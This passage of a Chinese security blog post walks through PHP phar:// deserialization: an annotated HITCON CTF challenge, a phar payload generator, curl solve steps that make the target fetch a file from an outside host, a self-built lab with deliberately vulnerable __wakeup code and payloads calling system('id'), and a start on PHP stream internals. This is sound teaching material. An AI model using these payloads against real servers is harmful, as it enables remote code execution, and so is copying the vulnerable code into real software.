$SANDBOX = <span class="string">"/var/www/data/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">	<span class="comment">// 根据 remote_addr 给每个人创建一个沙盒</span></span><br><span class="line">    @mkdir($SANDBOX);</span><br><span class="line">    @chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123;</span><br><span class="line">        $data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">        $hmac = hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET);</span><br><span class="line">        setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));</span><br><span class="line">        <span class="comment">//将每个人唯一的沙盒对象加上签名后作为 session-data</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $avatar;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;avatar = $path;</span><br><span class="line">            <span class="comment">//设置了头像的路径为沙盒路径</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            $random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"function my_function_$random() &#123;"</span></span><br><span class="line">                .<span class="string">"  global \$FLAG; \$FLAG();"</span>                                <span class="comment">/*反序列化这个对象就能创建一个随机名字的函数，调用这个函数就能调用 flag，实际上这是一个骗局，匿名函数也是有名字的*/</span></span><br><span class="line">                .<span class="string">"&#125;"</span>);</span><br><span class="line">            $_GET[<span class="string">"lucky"</span>]();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $SECRET;</span><br><span class="line">        $data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line">        <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">        $data = unserialize($data);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) )</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">        <span class="keyword">return</span> $data-&gt;avatar;                                               <span class="comment">//判断身份，如果身份正确返回头像路径(沙盒路径)</span></span><br><span class="line">                                                                            <span class="comment">//该函数不可绕过</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        $data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);            <span class="comment">//获取头像，检查头是否为GIF89a ，正确后存入沙盒,</span></span><br><span class="line">                                                                            <span class="comment">//这个就是利用 phar:// 进行反序列化的点</span></span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">        file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;                                                 <span class="comment">//获取这个沙盒中的头像，</span></span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($path . <span class="string">"/avatar.gif"</span>) )</span><br><span class="line">            $path = <span class="string">"/var/www/html"</span>;</span><br><span class="line">        header(<span class="string">"Content-Type: image/gif"</span>);</span><br><span class="line">        <span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $mode = $_GET[<span class="string">"m"</span>];</span><br><span class="line">    <span class="keyword">if</span> ($mode == <span class="string">"upload"</span>)</span><br><span class="line">        upload(check_session());</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>)</span><br><span class="line">        show(check_session());</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>题目代码非常简短，关键点我已经在图中给出了注释，我下面就简单的分析一下这道题</p>
+<p>这道题很明确就是一个反序列化的题，我们的目的就是通过反序列化 Admin 这个类得到我们的 flag 但是如果按照我们原先的思维，我们就可以直接放弃了，为啥？我们看一下 unserailize(）的部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">global</span> $SECRET;</span><br><span class="line">       $data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line">       <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line">       <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac))</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">       <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac) )</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">       $data = unserialize($data);</span><br><span class="line">       <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) )</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">       <span class="keyword">return</span> $data-&gt;avatar;                                               <span class="comment">//判断身份，如果身份正确返回头像路径(沙盒路径)</span></span><br><span class="line">                                                                           <span class="comment">//该函数不可绕过</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们想利用 unserailize() ，通过控制其参数去实现我们的反序列化，我们就必须绕过对 cookie 的检测，那我们看一下 cookie 是怎么生成的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$FLAG    = create_function(<span class="string">""</span>, <span class="string">'die(`/read_flag`);'</span>);                    <span class="comment">// 得到 flag 的匿名函数</span></span><br><span class="line">   $SECRET  = `/read_secret`;</span><br><span class="line">   $SANDBOX = <span class="string">"/var/www/data/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);   <span class="comment">// 根据 remote_addr 给每个人创建一个沙盒</span></span><br><span class="line">   @mkdir($SANDBOX);</span><br><span class="line">   @chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123;</span><br><span class="line">       $data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">       $hmac = hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET);</span><br><span class="line">       setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));      <span class="comment">//将每个人唯一的沙盒对象加上签名后作为 session-data</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>很清楚 cookie 是通过 remote_addr 配合 sha1 进行 hmac 签名生成的，想绕过他那是不可能的，当时的人们肯定都是沉迷于绕过这个，于是最终这道题是 全球 0 解，但是现在我们就要思考一下 是不是能用 Phar 这个在不使用 unserialize() 的方式完成序列化成功 get flag</p>
+<p><strong>那么回顾一下使用 Phar 反序列化的条件是什么</strong></p>
+<p>(1)文件上传点<br>(2)系统文件函数<br>(3) phar:// 伪协议</p>
+<p>然后我们就看到了这个函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);            <span class="comment">//获取头像，检查头是否为GIF89a ，正确后存入沙盒</span></span><br><span class="line">                                                <span class="comment">//这个就是利用 phar:// 进行反序列化的点</span></span><br><span class="line">    <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">    file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个太完美了，完全符合我们要求，我们只要的精心构造一个包含 Admin 对象、包含 avatar.gif 文件，并且 stub 是 <code>GIF89a&lt;?php xxx; __HALT_COMPILER();?&gt;</code> 的 phar 文件然后上传上去，下一次请求通过 Phar:// 协议让 file_get_contents 请求这个文件就可以实现我们对 Admin 对象的反序列化了(有人可能会说为什么不直接用 phar:// 请求远程文件<strong>，因为phar:// 不支持访问远程 URL</strong> )</p>
+<p><strong>生成 phar 的 paylod</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $avatar = <span class="string">'orz'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="keyword">__DIR__</span> . <span class="string">'/avatar.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p[<span class="string">'file.php'</span>] = <span class="string">'&lt;?php ?&gt;'</span>;</span><br><span class="line">$p-&gt;setMetadata(<span class="keyword">new</span> Admin());</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">rename(<span class="keyword">__DIR__</span> . <span class="string">'/avatar.phar'</span>, <span class="keyword">__DIR__</span> . <span class="string">'/avatar.gif'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里还有一个点需要提一下(虽然和反序列化没什么直接关系)，就是我们通过 eval 创建的函数并不能帮我们拿到 flag 因为他是随机名称的，我们是无法预测的，实际上这是 Orange 的一个障眼法，我们真正要利用的是 eval 下面的 <code>$_GET[&quot;lucky&quot;]();</code></p>
+<p>但是实际上我们的 $FLAG 也是一个匿名函数，但是匿名函数就真的没有名字了吗？非也，匿名函数的函数名被定义为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\000_lambda_&quot; . count(anonymous_functions)++;</span><br></pre></td></tr></table></figure>
+
+<p>这里的count 会一直递增到最大长度直到结束，这里我们可以通过大量的请求来迫使Pre-fork模式启动的Apache启动新的线程，这样这里的随机数会刷新为1，就可以预测了</p>
+<p><strong>下面给出 Orange 的解题过程</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># get a cookie</span><br><span class="line">$ curl http://host/ --cookie-jar cookie</span><br><span class="line"></span><br><span class="line"># download .phar file from http://orange.tw/avatar.gif</span><br><span class="line">$ curl -b cookie &apos;http://host/?m=upload&amp;url=http://orange.tw/&apos;</span><br><span class="line"></span><br><span class="line"># force apache to fork new process</span><br><span class="line">$ python fork.py &amp;</span><br><span class="line"></span><br><span class="line"># get flag</span><br><span class="line">$ curl -b cookie &quot;http://host/?m=upload&amp;url=phar:///var/www/data/$MD5_IP/&amp;lucky=%00lambda_1&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-自己搭建靶场"><a href="#5-自己搭建靶场" class="headerlink" title="5.自己搭建靶场"></a>5.自己搭建靶场</h4><p><strong>①unserialize()触发</strong></p>
+<p>存在漏洞代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">$p = <span class="keyword">$this</span>-&gt;m;</span><br><span class="line">$q = <span class="keyword">$this</span>-&gt;code;</span><br><span class="line">$p($q);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = getenv(<span class="string">'HTTP_TEST'</span>);</span><br><span class="line">$b = unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成payload代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">var $code;</span><br><span class="line">var $m;</span><br><span class="line">function __construct($code, $m)&#123;</span><br><span class="line">$this-&gt;code = $code;</span><br><span class="line">$this-&gt;m = $m;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test(&apos;id&apos;, &apos;system&apos;);</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>生成payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;code&quot;;s:2:&quot;id&quot;;s:1:&quot;m&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行效果：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvr45w4llj21fi0hxwgc.jpg" alt></p>
+<p><strong>②phar伪协议触发</strong></p>
+<p><strong>利用条件：</strong></p>
+<ul>
+<li>phar文件要能够上传到服务器端<br>要有可用的魔术方法作为“跳板”<br>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</li>
+</ul>
+<p>可利用的文件操作函数：<br>fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&apos;phar://phar.phar/test.txt&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>上述代码会自动进行反序列化操作<br>存在漏洞代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">$p = <span class="keyword">$this</span>-&gt;m;</span><br><span class="line">$q = <span class="keyword">$this</span>-&gt;code;</span><br><span class="line">$p($q);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = getenv(<span class="string">'HTTP_TEST'</span>);</span><br><span class="line">$b = file_get_contents($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成payload代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> $code;</span><br><span class="line"><span class="keyword">var</span> $m;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($code, $m)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;code = $code;</span><br><span class="line"><span class="keyword">$this</span>-&gt;m = $m;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub, 增加gif文件头，伪造文件类型</span></span><br><span class="line">$o = <span class="keyword">new</span> test(<span class="string">'id'</span>,<span class="string">'system'</span>);<span class="comment">//反序列对象</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：要生成phar文件，需要设置php.ini phar.readonly配置项为Off</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvr6aa2zjj20na0k2abm.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyvr6h135rj21d70alwft.jpg" alt></p>
+<h2 id="0X06-从-PHP-源码探索-phar-利用成功的深层原因"><a href="#0X06-从-PHP-源码探索-phar-利用成功的深层原因" class="headerlink" title="0X06 从 PHP 源码探索 phar 利用成功的深层原因"></a><strong>0X06 从 PHP 源码探索 phar 利用成功的深层原因</strong></h2><p>本文本来到上一个小结对PHP 反序列化的整个的分析就结束了，可我突然又想起来了前段时间看到了 @ZSX 大师傅的一片<a href="https://blog.zsxsoft.com/post/38?from=timeline&isappinstalled=0" target="_blank" rel="noopener">文章</a>，于是打算从师父哪里学姿势，正好弥补一下我对 PHP 底层肤浅的认识,所以我们继续~~</p>
+<h3 id="1-先介绍-PHP-流的概念"><a href="#1-先介绍-PHP-流的概念" class="headerlink" title="1.先介绍 PHP 流的概念"></a><strong>1.先介绍 PHP 流的概念</strong></h3><p>流的作用是在出发地和目的地之间传输数据。出发地和目的地可以是文件、命令行进程、网络连接、ZIP 或 TAR 压缩文件、临时内存、标准输入或输出，或者是通过 <strong>PHP 流封装协议</strong>实现的任何其他资源。</p>
+<p>如果你读写过文件，就用过流；如果你从 php://stdin 读取过数据，或者把输入写入 php://stdout，也用过流。流为 PHP 的很多 IO 函数提供了底层实现，如 file_get_contents、fopn、fread 和 fwrite 等。<strong>PHP 的流函数提供了不同资源的统一接口。</strong></p>
+<p>我们可以把流比作管道，把水（资源数据）从一个地方引到另一个地方。在水从出发地到目的地的过程中，我们可以过滤水，可以改变水质，可以添加水，也可以排出水。</p>
+<h3 id="2-介绍流封装协议（wrapper）："><a href="#2-介绍流封装协议（wrapper）：" class="headerlink" title="2.介绍流封装协议（wrapper）："></a><strong>2.介绍流封装协议（wrapper）：</strong></h3><p>因为流式数据的种类各异，而每种类型需要独特的协议，以便读写数据，我们称这些协议为流封装协议。例如，我们可以读写文件系统，可以通过 HTTP、HTTPS 或 SSH 与远程 Web 服务器通信，还可以打开并读写 ZIP、RAR 或 PHAR 压缩文件</p>
+<p>虽然过程是一样的，但是读写文件系统中文件的方式与收发 HTTP 消息的方式有所不同，流封装协议的作用是使用通用的接口封装这种差异。</p>
+<p>每个流都有一个协议和一个目标。指定协议和目标的方法是使用流标识符：<code>&lt;scheme&gt;://&lt;target&gt;</code>，其中 <code>&lt;scheme&gt;</code> 是流的封装协议，<code>&lt;target&gt;</code> 是流的数据源。</p>
+<h4 id="http-流封装协议"><a href="#http-流封装协议" class="headerlink" title="http://流封装协议"></a><strong>http://流封装协议</strong></h4><p>下面使用 HTTP 流封装协议创建了一个与 Flicker API 通信的 PHP 流：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$json = file_get_contents(</span><br><span class="line">    &apos;http://api.flickr.com/services/feeds/photos_public.gne?format=json&apos;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>不要以为这是普通的网页 URL，file_get_contents() 函数的字符串参数其实是一个流标识符。http 协议会让 PHP 使用 HTTP 流封装协议，在这个参数中，http 之后是流的目标。</p>
+<blockquote>
+<p>注：很多 PHP 开发者可能并不知道普通的 URL 其实是 PHP 流封装协议标识符的伪装。</p>
+</blockquote>
+<h4 id="file-流封装协议"><a href="#file-流封装协议" class="headerlink" title="file://流封装协议"></a><strong>file://流封装协议</strong></h4><p>我们通常使用 file_get_contents()、fopen()、fwrite() 和 fclose() 等函数读写文件系统，<strong>因为 PHP 默认使用的流封装协议是 file://</strong>，所以我们很少认为这些函数使用的是 PHP 流。下面的示例演示了使用 file:// 流封装协议创建一个读写 /etc/hosts 文件的流：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$handle = fopen(<span class="string">'file:///etc/hosts'</span>, <span class="string">'rb'</span>);</span><br><span class="line"><span class="keyword">while</span> (feof($handle) !== <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets($handle);</span><br><span class="line">&#125;</span><br><span class="line">fclose($handle);</span><br></pre></td></tr></table></figure>
+
+<p><strong>我们通常会省略掉 file:// 协议，因为这是 PHP 使用的默认值。</strong></p>
+<p>这两段介绍来源于<a href="https://laravelacademy.org/post/7459.html%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E8%AF%B4%E6%98%8E%E4%BA%86%E4%B8%80%E4%B8%AA%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%E5%91%A2%EF%BC%9F%E8%AF%B4%E6%98%8E%E6%88%91%E4%BB%ACPHP" target="_blank" rel="noopener">https://laravelacademy.org/post/7459.html，那么这个说明了一个什么问题呢？说明我们PHP</a> 目前的几乎所有的 I/O 操作都是通过流配合流包装器来实现的，<strong>因为 PHP 默认的包装器就是 file://</strong> ，虽然你没写，但是底层 PHP 还是通过流包装器实现的。</p>
+<h4 id="还有更多"><a href="#还有更多" class="headerlink" title="还有更多"></a><strong>还有更多</strong></h4><p>使用 <strong>stream_get_wrappers()</strong> 获取当前系统注册的全部 wrapper</p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%9C%89%E5%93%AA%E4%BA%9B%20wrappers.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%9C%89%E5%93%AA%E4%BA%9B%20wrappers.png" alt="此处输入图片的描述"></a></p>
+<h3 id="3-开始向下挖掘："><a href="#3-开始向下挖掘：" class="headerlink" title="3.开始向下挖掘："></a><strong>3.开始向下挖掘：</strong></h3><p>我们上面说了，phar 文件中存在我们可控的序列化的内容，然后我们又说，这个内容在 文件系统函数 配合 phar:// 的时候能实现反序列化，但是我们没说为什么，这也就是我们这节讨论的重点，所有的原因都能从源代码找到答案</p>
+<h4 id="1-先看一下-Phar-文件源代码部分"><a href="#1-先看一下-Phar-文件源代码部分" class="headerlink" title="(1)先看一下 Phar 文件源代码部分"></a><strong>(1)先看一下 Phar 文件源代码部分</strong></h4><p>因为 Phar 是 PHP 的一个扩展，于是我们在 GitHub 的 php-src/ext/phar/phar.c 去全局搜索 <a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618" target="_blank" rel="noopener">unserailize()</a> 函数</p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Phar%20%E6%96%87%E4%BB%B6%E6%BA%90%E7%A0%81.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Phar%20%E6%96%87%E4%BB%B6%E6%BA%90%E7%A0%81.png" alt="此处输入图片的描述"></a></p>
+<h4 id="2-但是这个函数为什么能调用呢"><a href="#2-但是这个函数为什么能调用呢" class="headerlink" title="(2)但是这个函数为什么能调用呢"></a><strong>(2)但是这个函数为什么能调用呢</strong></h4><p>这就涉及到了文件系统函数的部分了，我们找一下源码，位置在 Github php-src/ext/standard/file.c<br>这个文件包含了非常多的文件函数的实现，我们先全局搜索 <a href="https://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L519" target="_blank" rel="noopener">file_get_contents</a></p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/file_get_contents.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/file_get_contents.png" alt="此处输入图片的描述"></a></p>
+<p>然后我们稍微往下翻翻就能发现和<a href="https://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L550" target="_blank" rel="noopener">处理 wrapper 流相关的函数</a></p>
+<p><strong>如图所示：</strong></p>
+<p><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/open_wrapper.png" target="_blank" rel="noopener"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/open_wrapper.png" alt="此处输入图片的描述"></a></p>
+<p>我们发现了这个 php)stream_open_wrapper_ex 这个函数能处理我们的 wrapper ，那么其他的类似的函数是不是也是底层调用了这个函数呢？</p>
+<h4 id="3-由此及彼"><a href="#3-由此及彼" class="headerlink" title="(3)由此及彼"></a><strong>(3)由此及彼</strong></h4><p>我们全局搜索一下 <a href="https://github.com/php/php-src/blob/master/ext/standard/file.c#L871" target="_blank" rel="noopener">fopen()</a>，然后我们看一下具体的实现</p>
+<p><strong>如图所示：</strong></p>
